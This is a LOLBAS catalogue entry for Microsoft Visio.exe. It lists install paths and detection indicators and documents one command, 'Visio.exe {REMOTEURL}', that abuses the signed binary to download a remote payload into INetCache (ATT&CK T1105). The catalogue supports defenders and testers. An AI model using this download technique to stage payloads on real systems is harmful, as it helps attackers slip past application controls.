---
title: "Visio.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Visio/
fetched_at: 2026-09-20T17:15:38Z
license: unspecified
category: windows
---

Microsoft Visio Executable

## Paths
- C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe
- C:\Program Files\Microsoft Office\Office14\Visio.exe
- C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe
- C:\Program Files\Microsoft Office\Office15\Visio.exe
- C:\Program Files (x86)\Microsoft Office\Office16\Visio.exe
- C:\Program Files\Microsoft Office\Office16\Visio.exe
- C:\Program Files (x86)\Microsoft Office\root\Office14\Visio.exe
- C:\Program Files\Microsoft Office\root\Office14\Visio.exe
- C:\Program Files (x86)\Microsoft Office\root\Office15\Visio.exe
- C:\Program Files\Microsoft Office\root\Office15\Visio.exe
- C:\Program Files (x86)\Microsoft Office\root\Office16\Visio.exe
- C:\Program Files\Microsoft Office\root\Office16\Visio.exe

## Acknowledgements
- Avihay Eldad ([@AvihayEldad](https://twitter.com/@AvihayEldad))

## Detections
- IOC: URL on a visio.exe command line
- IOC: visio.exe making unexpected network connections or DNS requests

## Download

1. Downloads payload from remote server

```
Visio.exe {REMOTEURL}
```

   - Use case: It will download a remote payload and place it in INetCache.

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
